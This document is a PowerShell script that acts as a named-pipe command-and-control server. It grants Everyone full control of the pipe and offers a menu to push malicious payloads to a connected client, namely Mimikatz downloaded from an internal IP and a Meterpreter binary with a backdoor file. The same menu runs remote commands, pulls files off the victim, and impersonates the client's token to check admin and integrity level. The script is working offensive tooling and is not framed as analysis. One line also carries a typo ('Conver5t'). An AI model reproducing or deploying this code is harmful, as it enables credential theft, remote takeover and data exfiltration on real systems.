# RunasUser use a thread to perform action. Token always take the primary token link to the process
# CreateProcessAsUser need a primary token as a parameter
# Need to duplicate the token to make a primary 

function ReadMsg([System.IO.StreamReader]$StreamReader){
    $msg = $StreamReader.ReadLine()
    Write-Host $msg
}

try{
    $pipeName = "YahudPipe";
    $pipeSecurity = New-Object System.IO.Pipes.PipeSecurity

    $rule = New-Object System.IO.Pipes.PipeAccessRule(
        "Everyone",
        [System.IO.Pipes.PipeAccessRights]::FullControl,
        [System.Security.AccessControl.AccessControlType]::Allow
    )

    $pipeSecurity.AddAccessRule($rule)

    $pipeServer = New-Object System.IO.Pipes.NamedPipeServerStream(
        $pipeName,
        [System.IO.Pipes.PipeDirection]::InOut,
        1,
        [System.IO.Pipes.PipeTransmissionMode]::Message,
        [System.IO.Pipes.PipeOptions]::None,
        4096,
        4096,
        $pipeSecurity
    ); # Creation new pipe object

    Write-Host "Listening on \\.pipe\$pipeName";
    $waitingTask = $pipeServer.WaitForConnectionAsync();
    if (-not $waitingTask.Wait(90000)) {
        Write-Host "Timeout"
        $pipeServer.Dispose()
        $pipeServer.Close()
        $waitingTask = $null
        $pipeServer = $null
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
        return
    }
    $sr = New-Object System.IO.StreamReader($pipeServer) # StreamReader read text from a file, from $pipe here
    $sw = New-Object System.IO.StreamWriter($pipeServer)
    $user = $sr.ReadLine()
    Write-Host "Connection Established... from", $user


    $sw.AutoFlush=$true
    $context = $null

    while ($pipeServer.IsConnected){
        # Reset the variables command and messages after each task
        $msg = ""
        $command = ""
        $path = ""

        $action = Read-Host "
        1. Send message to client
        2. Run Malicious code
        3. Run Command
        4. Extract file
        5. Impersonation
        6. Quit
"
        
        if ($action -eq 1){
            $sw.WriteLine("action=1")
            while($msg -ne ":quit"){
                $msg = Read-Host "Enter your message to send (:quit to stop)"
                $sw.WriteLine($msg)
            }
        }

        elseif ($action -eq 2){
            $sw.WriteLine("action=2")
            $script_action = Read-Host "
            1.Mimikatz
            2.Meterpreter
            3.Test PowerShell Assembly
"
            
            Write-Host "Uploading malicious payload to client"

            if ($script_action -eq 1){
                $sw.WriteLine("Mimikatz")
                $assemblyByte = (New-Object Net.WebClient).DownloadData("http://192.168.101.20:1996/LoadMimikatz.exe")
                $assemblyB64 = [System.Convert]::ToBase64String($assemblyByte)
                $sw.WriteLine($assemblyB64) # Server sending to the client
                $sw.Dispose()
                $pipeServer.Dispose()
            }

            elseif ($script_action -eq 2) {
                $sw.WriteLine("Meterpreter")
                $assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\meterpreter\Yahudmeter\yahudmeter.exe'
                # $assemblyPath = 'C:\Users\HakkYahud\Documents\Symantec\meterpreter\Yahudmeter\sharpmeter.exe'
                $backdoor = "C:\Users\HakkYahud\Documents\Symantec\meterpreter\Yahudmeter\exploit.txt"
                $assemblyByte = [System.IO.File]::ReadAllBytes($assemblyPath)
                $assemblyB64 = [System.Conver5t]::ToBase64String($assemblyByte)
                $sw.WriteLine($assemblyB64)
                [String]$parameter = [System.IO.File]::ReadAllText($backdoor)
                $sw.WriteLine($parameter)
                $sw.Dispose()
                $pipeServer.Dispose()
            }

            else {
                $sw.WriteLine("Test PowerShell Assembly")
                $assemblyPath = "C:\Users\adminPC\Documents\Admin\Yahudmeter\yahudmeter.exe"
                $sw.WriteLine($assemblyPath)
                $backdoor = "C:\Users\adminPC\Documents\Admin\Yahudmeter\exploit.txt"
                $sw.WriteLine($backdoor)
            }

        }

        elseif ($action -eq 3){
            $sw.WriteLine("action=3")
            while($command -ne ":quit"){
                $command = Read-Host "Run command (:quit to stop)"
                $sw.WriteLine($command)

                if($command -eq ":quit"){
                    # do nothing
                }

                else{
                    # Receive command result lenght from the client
                    $lenght = [int]$sr.ReadLine()

                    #Output the command result
                    for($cpt = 0; $cpt -lt $lenght; $cpt++){
                        $result = $sr.ReadLine()
                        Write-Host $result
                    }  
                }
            }
        }

        elseif ($action -eq 4){
            Write-Host "Extracting file"
            $sw.WriteLine("action=4")
            while($path -ne "stop"){
                $path = Read-Host "Path of the file to extract"
                $sw.WriteLine($path)

                if($path -eq "stop"){
                    # do nothing
                }

                else{
                    $response = $sr.ReadLine()
                    if ($response -eq "Please specify a file..."){
                        Write-Host $response
                    }
                    elseif($response -eq "File Not Found..."){
                        Write-Host $response
                    }
                    else {
                        Write-Host "Copying file"       
                        $bytefileb64 = $response
                        $bytefile = [System.Convert]::FromBase64String($bytefileb64)
                        $filename = Split-Path $path -Leaf
                        Write-Host $filename
                        Write-Host $bytefile

                        $path_to_copy = "{0}\Documents\FileExtractedFromPipe" -f $env:USERPROFILE
                        try{
                            [System.IO.File]::WriteAllBytes($path_to_copy+"\"+$filename, $bytefile)
                            Write-Host "File extracted"
                        }
                        catch [System.IO.DirectoryNotFoundException]{
                            Write-Host "Target directory not found"
			                Write-Host "Creating target directory : $path_to_copy..."
			                Invoke-Expression "mkdir $path_to_copy"
                            [System.IO.File]::WriteAllBytes($path_to_copy+"\"+$filename, $bytefile)
                            Write-Host "File extracted"
                        }
                    }
                }             
            }
        }

        elseif ($action -eq 5){
            Write-Host "Impersonation"
            $sw.WriteLine("action=5")
            $script:clientIdentity = $null
            $script:clientName = $null
            $script:clientIsSystem = $false
            $script:clientIsAdmin = $false
            $script:clientImpersonationLevel = $null

            $pipeServer.RunAsClient({
                $script:clientIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $script:clientName = $script:clientIdentity.Name
                $script:clientIsSystem = $script:clientIdentity.IsSystem
                $script:clientImpersonationLevel = $script:clientIdentity.ImpersonationLevel
                
                $principal = New-Object System.Security.Principal.WindowsPrincipal($script:clientIdentity)
                $script:clientIsAdmin = $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
            })
            Write-Host "[+] Client name: $($script:clientName)"
            Write-Host "[+] Client is SYSTEM: $($script:clientIsSystem)"
            Write-Host "[+] Client is admin: $($script:clientIsAdmin)"
            Write-Host "[+] Client Impersonation Level: $($script:clientImpersonationLevel)"
            Write-Host $script:clientIdentity.IsAnonymous
            Write-Host $script:clientIdentity.User.Value
            Write-Host $script:clientIdentity.AuthenticationType
            Write-Host $script:clientIdentity.Token

            $context = $script:clientIdentity.Impersonate()
            $current = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $currentprincipal = New-Object System.Security.Principal.WindowsPrincipal($current)
            $currentIsAdmin = $currentprincipal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
            if ($currentIsAdmin){
                Write-Host "[+] Now running as: $($current.Name) with admin privilege"
                
            }
            else {
                Write-Host "[+] Now running as: $($current.Name) without admin privilege"
            }
            Write-Host "[+] Impersonation Level: $($current.ImpersonationLevel)"
            $intSid = $current.Groups | Where-Object { $_.Value -like "S-1-16-*" }
            Write-Host "[DEBUG]: $intSid"
            $integrityLevel = switch ($intSid.Value) {
                "S-1-16-4096" { "Low" }
                "S-1-16-8192" { "Medium" }
                "S-1-16-12288" { "High" }
                "S-1-16-16384" { "System" }
                default { $intSid.Value }
            }

            Write-Host "[+] Integrity Level: $($integrityLevel)"
            $context.Undo()
        }

        elseif ($action -eq 6){
            $sw.WriteLine("action=6")
            $sw.Dispose()
            $pipeServer.Dispose()
        }
    }
    $sw.Dispose()
    $pipeServer.Dispose()

}

catch{
    Write-Host "Failed to create the pipe $pipeName : $_"
    return 0;
}